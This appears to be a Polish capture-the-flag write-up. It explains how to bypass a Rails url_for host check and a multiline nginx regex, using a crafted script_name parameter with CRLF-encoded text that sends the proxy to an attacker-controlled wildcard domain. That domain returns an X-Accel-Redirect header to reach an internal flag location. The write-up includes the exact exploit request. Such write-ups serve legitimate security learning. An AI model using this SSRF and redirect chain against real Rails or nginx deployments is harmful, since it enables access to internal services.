# Opis

Apka:

1. Dostaje request do `http://127.0.0.1/avatar?image=basement.jpg`
2. Tworzy sobie URLa `http://justcattheimages.s3.eu-central-1.amazonaws.com/img/basement.jpg` uywając w rubym url_for: `image_url = url_for(request.query_parameters.merge(controller: 'avatars', action: 'get', host: 'justcattheimages.s3.eu-central-1.amazonaws.com', subdomain: false, domain: 'justcattheimages.s3.eu-central-1.amazonaws.com', protocol: 'http', only_path: false, port: 80))`
3. Robi request do internalowego nginxa pod `http://nginx:8000/fetcher?url=https://justcattheimages.s3.eu-central-1.amazonaws.com/img/basement.jpg`
4. Nginx validuje regexem `targetUrl.match(/^https?:\/\/justcattheimages\.s3\.eu-central-1\.amazonaws\.com\/img\/[a-z]+\.jpg$/m)` URLa i robi tam proxy_pass
5. Odpowiedź z obrazkiem jest zwracana do usera

# Solve

Flaga jest zwracana z internalowego nginxa, niewystawionego do usera:

```
http {
    resolver 8.8.8.8;

    server {
        listen 8000;

        js_path "/etc/nginx/njs/";
        js_import js from validate.js;

        location /fetch {
            set $target_url $arg_url;  # Get URL from query parameter
            js_set $valid js.valid_url;
            if ($valid != '') {
                return 403;
            }
            proxy_pass $target_url;
        }

        location /flag {
            internal;
            return 200 "jctf{flag}";
        }
    }

    server {
        listen 80;

        location / {
            proxy_pass http://rails_app:3000;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
        }
    }
}
```

1. Robimy request do `http://localhost/avatar?image=hacker.jpg&script_name=.72f3427fcc6f7ef15c5beee70ea02607.bountyexplained.com/%0d%0a%250d%250ahttps://justcattheimages.s3.eu-central-1.amazonaws.com`
2. Script_name to jeden z parametrów url_for, który powinien, ale nie wymaga, zeby pomiedzy domeną, a pathem był slash, więc tworzony URL to `http://justcattheimages.s3.eu-central-1.amazonaws.com.72f3427fcc6f7ef15c5beee70ea02607.bountyexplained.com/%0d%0a%250d%250ahttps://justcattheimages.s3.eu-central-1.amazonaws.com/img/basement.jpg`
3. Regex ma multiline, więc ten URL przechodzi
4. Nginx robi proxy pass do naszego servera. Robimy domenę z wildcardem i zwracamy header `X-Accel-Redirect: /flag`
5. Nginx robi internalowe przekierowanie i zwraca flagę
